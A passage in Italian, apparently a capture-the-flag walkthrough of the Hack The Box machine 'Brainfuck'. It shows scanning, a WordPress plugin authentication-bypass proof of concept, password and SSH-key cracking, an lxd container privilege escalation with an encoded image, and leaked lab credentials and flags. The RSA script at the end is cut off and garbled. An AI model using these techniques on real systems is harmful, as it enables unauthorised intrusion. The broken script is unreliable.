**TARGET: 10.10.10.17

# INFORMATION GATHERING

Lanciamo un primo scan veloce con [[Nmap]]
```bash
┌──(root㉿kali)-[/home/kali/brainfuck]
└─# nmap -sC -sV -O -min-rate=5000 10.10.10.17 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 07:13 EDT
Nmap scan report for 10.10.10.17
Host is up (0.043s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE SASL(PLAIN) CAPA UIDL PIPELINING USER TOP
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: capabilities ID listed OK post-login have LOGIN-REFERRALS IMAP4rev1 ENABLE IDLE Pre-login more LITERAL+ SASL-IR AUTH=PLAINA0001
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.4 (92%), Linux 4.8 (92%), Linux 4.9 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 
```

Un ulteriore scan su tutte le porte non ci da nessuna nuova informazione

Ricapitolando:

1. La versione di SSH in uso non è associata ad alcuna vulnerabilità critica, quindi è improbabile che la porta 22 sia il nostro punto di ingresso. Avremo bisogno di credenziali per questo servizio.
2. La porta 443 esegue HTTPS. La pagina dell'indice ci dà il titolo "Welcome to nginx!". Questo è probabilmente un problema di configurazione in cui l'indirizzo IP non sa a quale nome host dovrebbe essere mappato per servire un sito specifico e quindi serve invece la pagina predefinita di ngnix. Per risolvere questo problema, dovremo prima capire l'elenco dei nomi host che si risolvono in questo indirizzo IP e quindi aggiungere questi nomi host al nostro file /etc/hosts. Dalla scansione nmap, otteniamo tre possibili hostname: brainfuck.htb, www.brainfuck.htb e sup3rs3cr3t.brainfuck.htb.
4. Le porte 25, 143 e 110 eseguono i protocolli di posta. Potremmo aver bisogno di trovare un indirizzo email valido per enumerare ulteriormente questi servizi

# ENUMERATION

Aggiungiamo i hostmane trovati con nmap nel file /etc/hosts

```bash
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb.
```

Vistiando https://brainfuck.htb ci troviamo di fronte a quello che sembra essere un sito WordPress
![](../zzz_rev/attachments/Brainfuck2.png)

guardando i dettagli dei certificati ,vediamo che il campo Emittente ci fornisce l'indirizzo e-mail orestis@brainfuck.htb che potrebbe essere utile quando si enumerano le porte del protocollo di posta aperte. Questa e-mail può essere trovata anche sul sito web.

![](../zzz_rev/attachments/Brainfuck1.png)

Come detto prima ci troviamo di fronte a quello che sembra essere un sito WordPress
Utilizziamo lo strumento [[Wpscn]]

```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]                                   
└─# wpscan --url https://brainfuck.htb --disable-tls-checks --api-token aFEiZnsEMbUOSsvssz1pEPejgvMFBxpOTLpUoElyRCM
_______________________________________________________________                  
         __          _______   _____                                             
         \ \        / /  __ \ / ____|                                            
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                           
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                           
            \  /\  /  | |     ____) | (__| (_| | | | |                           
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                                                                         
                         Version 3.8.22                                                                                                                                                                                                    
       Sponsored by Automattic - https://automattic.com/                                                                                                                                                                                   
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                  
[+] URL: https://brainfuck.htb/ [10.10.10.17]                                                                                                                                                                                              
[+] Started: Tue Jun 13 16:17:58 2023                                            

[i] Plugin(s) Identified:                                                        
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/                                                  
 | Last Updated: 2019-09-03T07:57:00.000Z   
 | [!] The version is out of date, the latest version is 9.1.2                                                
 | Found By: Urls In Homepage (Passive Detection)                            
 | [!] 6 vulnerabilities identified:                                                                                                            
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757
 |      - https://www.exploit-db.com/exploits/40939/
 |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
 |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution (RCE)
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1
 |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 9.0.3 - Multiple Authenticated SQL Injection
 |     Fixed in: 9.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131
 |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md
 |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 9.1.2 - Stored XSS
 |     Fixed in: 9.1.2
 |     References:
 |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331
 |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/
 |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
 |     Fixed in: 8.0.0
 |     References:
 |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
 |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
 |      - https://packetstormsecurity.com/files/140413/
 |
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
 |      - https://plugins.trac.wordpress.org/changeset/1763596
 |
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt


```

È in esecuzione WP Support Plus Ticket System 7.1.3. wpscan trova 6 vulnerabilità in questo plugin. Quando è stato rilasciato Brainfuck, la versione corrente di questo plugin era la 8.0.7, quindi ignorerò i due che affermano di essere RCE per la versione inferiore alla 8.0.8.

C'è anche qualche iniezione SQL autenticata, che potrei tenere a mente nel caso trovassi crediti. Il resto più interessante è questo:

```bash
┌──(root㉿kali)-[/home/kali]
└─# searchsploit  WP Support Plus Responsive Ticket System 

WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities| php/webapps/34589.txt

WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation php/webapps/41006.txt

WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection  | php/webapps/40939.txt

```

Diamo un occhiata la 41006.txt

```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# cat 41006.txt              
# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
# Date: 10-01-2017
# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: web

1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>

Then you can go to admin panel.                 
```

Secondo la documentazione, questa vulnerabilità consente di aggirare l'autenticazione accedendo come chiunque senza conoscere la password. Tuttavia, è necessario un nome utente valido affinché l'attacco funzioni. Pertanto, usiamo wpscan per enumerare i nomi utente.

```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u

...<snip>...
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

..<snip>..
```

Sia "admin" che "administrator" sono nomi utente validi. Ora che abbiamo un nome utente valido, proviamo a sfruttare la vulnerabilità.

# GAINING AN INITIAL FOOTHOLD 

Copia il codice POC dalla voce della vulnerabilità su searchsploit e salvalo nel file priv-esc.html. Modificare l'URL con il nome della macchina.

```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# cat exploit.htlm 
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

Lo eseguiamo nel browser e accedimo come amministratore.

Aggiorniamo la pagina brainfuck.htb e abbiamo effettuato l'accesso come amministratore!

Non sembrano esserci molte funzionalità disponibili per questo utente. Pertanto, proviamo l'utente "admin" successivo. Esegui di nuovo lo stesso exploit tranne che con il nome utente "admin".

Aggiorniamo la pagina brainfuck.htb e abbiamo effettuato l'accesso come admin

Nella scheda in alto nel percorso Brainfuck Ltd. > Temi Plugin > Impostazioni sul plug-in Easy WP SMTP. Lì troviamo le impostazioni di configurazione SMTP con il nome utente SMTP e la password mascherata SMTP.

Analizzando con l'ispector troviamo la password in chiaro 

La password dell'utente è kHGuERB29DNiNE. Usiamo il client di posta Evolution per accedere alla posta di orestis. Se non hai Evolution installato sul tuo kali, puoi installarlo usando il seguente comando.

```bash
sudo apt-get install evolution
```

Una volta istallato lo apriamo e seguiamo le istruzione della modalità benvenuto 

![[../zzz_rev/attachments/1*8cfk_zqsdwrVajKlxbmlQg.webp]]

Inseriamo il nome orestis nel campo Nome completo e orestis@brainfuck.htb nel campo Indirizzo e-mail.

![[../zzz_rev/attachments/1*LWH8GoJ6cC1D_pbc9xuB-g.webp]]

Nella finestra Ricezione email, aggiungiamo brainfuck.htb come Server, 143 come Porta e orestis come Nome utente.

Nella finestra Invio e-mail, aggiungiamo brainfuck.htb come Server, 25 come Porta e Nessuna crittografia come Metodo di crittografia.

![[../zzz_rev/attachments/1*O7O_-dNp-671U28OoVGYoA.webp]]
Ci verra richiesta password di autenticazione. Inseriamo kHGuERB29DNiNE e facciamo clic su OK. Ora possiamo vedere la posta di Orestis!

Nella posta troviamo questo messaggio 

![[../zzz_rev/attachments/1*q7VcbUijHJjh9z2Wt9VKVA.webp]]

Nella fase di enumerazione avevamo tre nomi host che abbiamo aggiunto al nostro file hosts. Poiché l'e-mail menziona un forum "segreto", diamo un'occhiata al sito Web sup3rs3cr3t.brainfuck.htb. Sul sito Web, quando facciamo  clic su Accedi, ci viene presentata una pagina di accesso. Inseriamo  le nostre credenziali appena trovate.

Siamo loggati come orestis!

![[../zzz_rev/attachments/1*a4wJVzPvdlsjwy6G5U10eQ.webp]]

Facciamo clic sul thread di accesso SSH.

Sulla base dei commenti fatti lì, orestis sembra aver perso la sua chiave SSH e vuole che l'amministratore gliela invii su un thread crittografato. Un'altra cosa che notiamo è che Orestis firma sempre il suo messaggio con la frase "Orestis — Hacking for fun and profit".

Nel thered Key, notiamo che i commenti di Orestis sono firmati con lo stesso messaggio che abbiamo visto sopra, tranne che il messaggio è in forma crittografata. Tuttavia, con ogni commento, il testo cifrato generato per la frase è diverso. Pertanto, l'amministratore potrebbe utilizzare il cifrario di Vigenère che è una variazione di un cifrario di sostituzione di Cesare che utilizza una parola chiave e la ripete finché non corrisponde alla lunghezza del testo in chiaro. Quindi la lettera equivalente della parola chiave viene utilizzata per crittografare la corrispondente lettera di testo in chiaro. Pertanto, lo stesso testo in chiaro può generare più testi cifrati diversi.
Dal momento che abbiamo il testo in chiaro e il corrispondente testo cifrato, possiamo dedurre la chiave poiché questo cifrario è vulnerabile a un noto attacco di testo in chiaro. Questa pagina lo spiega molto bene, quindi non spiegherò come fare.

Ho scritto uno script Python per automatizzare il processo di ricerca della chiave.
```pyhton
plaintext = "OrestisHackingforfunandprofit"  
ciphertext = "PieagnmJkoijegnbwzwxmlegrwsnn"  
key = ""for i in range(len(plaintext)):  
 num_key = ((ord(ciphertext[i]) - ord(plaintext[i])) % 26) + 97  
 char_key = chr(num_key)  
 key = key + char_keyprint key
 
```

Lo script scorre la stringa di testo cifrata e prende ogni carattere in ordine e lo converte nella rappresentazione intera di quel carattere. Quindi sottrae quel valore dalla rappresentazione intera del carattere corrispondente nella stringa di testo in chiaro e applica il modulo di 26 poiché ci sono 26 alfabeti. Questo ti dà un valore compreso tra 0 e 25 inclusi. Tuttavia, poiché la funzione "chr" che trasforma un numero intero nel suo valore di carattere dipende dalla tabella ASCII dove 97 rappresenta "a", 98 rappresenta "b", ecc. Ho dovuto aggiungere 97 al valore intero. Dopo aver passato in rassegna l'intero testo cifrato, stampa la chiave.
Eseguiamo lo script.

```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# python2  vigenere-key-decry.py
brainfuckmybrainfuckmybrainfu

```

Come accennato in precedenza, il cifrario di Vigenère utilizza una parola chiave e la ripete finché non corrisponde alla lunghezza del testo in chiaro. Pertanto, possiamo dedurre che la chiave è. Ora che abbiamo la chiave, possiamo usarla per decifrare la dichiarazione dell'amministratore utilizzando questo strumento [online](https://www.dcode.fr/vigenere-cipher).

Una volta decifrato il testo otteniamo 

```
There you go you stupid fuck, I hope you remember your key password because I dont :)  
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

Il testo decifrato ci fa ottenere una chiave id_rsa cifrata che ci prendiamo con curl  e lo salviamo in un file che chiamiamo id_rsa

```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# curl https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----

```

Salviamo la chiave in un file che chiameremo id_rsa e useremo ssh2john.py per generare un hash dalla chiave, quindi craccarlo con john:

```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# ssh2john id_rsa > id_rsa.hash
                                                                                
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)     
1g 0:00:00:05 DONE (2023-06-13 17:35) 0.1915g/s 2387Kp/s 2387Kc/s 2387KC/s 3prash0..3pornuthin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Abbiamo la passphrase  e  possiamo salvarci una copia della id_rsa senza password usando openssl:
```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# openssl rsa -in id_rsa > id_rsa_decrypt
Enter pass phrase for id_rsa:
writing RSA key

```


possiamo collegarci trammite ssh e prenderci la nostra flag user
```bash
┌──(root㉿kali)-[/home/kali/htb/brainfuck]
└─# ssh -i id_rsa_decrypt orestis@brainfuck.htb 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
orestis@brainfuck:~$ cat user.txt 
2c11cfbc5b959f73ac15a3310bd097c9

```

# PRIVESC

Come possiamo vedere Orestis fa parte del gruppo lxd:

```bash
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)

```

Essere nel gruppo lxd significa che posso interagire con lxc, il runtime del contenitore Linux. 

Con `lxc list`  vediamo che non ci sono container in esecuzione:

```bash
orestis@brainfuck:~$ lxc list 
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+

```

Non sono inoltre disponibili immagini:

```bash
orestis@brainfuck:~$ lxc image list 
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
```

## EXPLOIT LXC

Prof of Concept 

L'idea qui è la stessa strategia utilizzata con vari exploit di virtualizzazione. Creerò un nuovo contenitore e monterò l'intero sistema operativo host in quel contenitore da qualche parte. Quindi otterrò una shell su quel contenitore come root e avrò pieno accesso al file system host.

Per creare un contenitore, dovrò generare un'immagine, caricarla su Brainfuck e quindi generare un contenitore da essa. La maggior parte degli esempi di questo exploit utilizzerà il contenitore Alpine, in quanto è il contenitore comune più piccolo e quindi più facile da caricare. Poiché non ho bisogno di un'immagine completa, ma piuttosto, quanto basta per ottenere una shell con il filesystem host montato, il mio modo preferito per sfruttarlo è da questo [post](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1) di M0noc, che crea una stringa di 656 byte che può essere utilizzata per creare un'immagine di busybox barebone.

Lavorando su /dev/shm, "caricherò" l'immagine copiando il comando echo dal post:

```bash
orestis@brainfuck:/dev/shm$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2

```

Importerò quell'immagine:

```bash
orestis@brainfuck:/dev/shm$ lxc image import bob.tar.bz2 --alias bobImage
Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d
```

Crea e avvia VM

Per creare la VM, eseguirò lxc init e poi aggiungerò la radice del filesystem host in /r:

```bash
orestis@brainfuck:/dev/shm$ lxc init bobImage bobVM -c security.privileged=true
Creating bobVM
orestis@brainfuck:/dev/shm$ lxc config device add bobVM realRoot disk source=/ path=r
Device realRoot added to bobVM
```

Avvio il contenitore e ora viene visualizzato nell'elenco lxc:

```bash
orestis@brainfuck:/dev/shm$ lxc start bobVM 
orestis@brainfuck:/dev/shm$ lxc list 
+-------+---------+------+------+------------+-----------+
| NAME  |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+-------+---------+------+------+------------+-----------+
| bobVM | RUNNING |      |      | PERSISTENT | 0         |
+-------+---------+------+------+------------+-----------+

```

#### Shell in Container
`lxc exec` : mi permetterà di ottenere una shell nel contenitore:

```bash
orestis@brainfuck:/dev/shm$ lxc exec bobVM -- /bin/bash
bash-4.3# id
uid=0(root) gid=0(root) groups=0(root)
bash-4.3# 
```

## ROOT FLAG SENZA SHELL

Vediamo i file contenuti all'interno della directory

```bash
orestis@brainfuck:~$ ls -la
total 56
drwxr-xr-x 7 orestis orestis 4096 Oct  3  2022 .
drwxr-xr-x 3 root    root    4096 Sep 15  2022 ..
lrwxrwxrwx 1 root    root       9 Sep 15  2022 .bash_history -> /dev/null
-rw-r--r-- 1 orestis orestis  220 Apr 13  2017 .bash_logout
-rw-r--r-- 1 orestis orestis 3771 Apr 13  2017 .bashrc
drwx------ 2 orestis orestis 4096 Sep 15  2022 .cache
drwxr-xr-x 3 root    root    4096 Sep 15  2022 .composer
-rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
drwx------ 3 orestis orestis 4096 Sep 15  2022 mail
-rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
-rw-r--r-- 1 orestis orestis  655 Apr 13  2017 .profile
drwx------ 8 orestis orestis 4096 Sep 15  2022 .sage
drwx------ 2 orestis orestis 4096 Sep 15  2022 .ssh
-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
orestis@brainfuck:~$ 
```

mail è una directory vuota. I due file .txt hanno numeri lunghi e output.txt li etichetta come "Encrypted Password":

```bash
orestis@brainfuck:~$ cat debug.txt 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 orestis@brainfuck:~$ cat output.txt Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

encrypt.sage è uno script.

```bash
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')

```

Sembra che stia eseguendo la crittografia RSA. Innanzitutto, apre il file root.txt e utilizza il suo valore come parametro nella crittografia. La password crittografata è scritta nel file output.txt. Registra anche i parametri nel file debug.txt.
I parametri p, q ed e sono registrati nel file di debug a cui abbiamo accesso in lettura/scrittura. Poiché abbiamo sia p che q, possiamo calcolare n=p*q, phi=(p-1)(q-1). Abbiamo anche c poiché è scritto nel file output.txt a cui abbiamo accesso in lettura/scrittura. Quindi possiamo calcolare m dall'equazione c = pow(m,e,n).
Invece di farlo a mano, qualcuno ha già scritto uno [script](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e). Per prima cosa modifica lo script per includere i nostri valori.

### Scritp 1 

```bahs
def egcd(a, b):
x,y, u,v = 0,1, 1,0 
while a != 0:
      q, r = b//a, b%a 
      m, n = x-u*q, y-v*q b,a, x,y, u,v = a,r, u,v, m,n 
      gcd = b 
      return gcd, x, y 
def main(): 
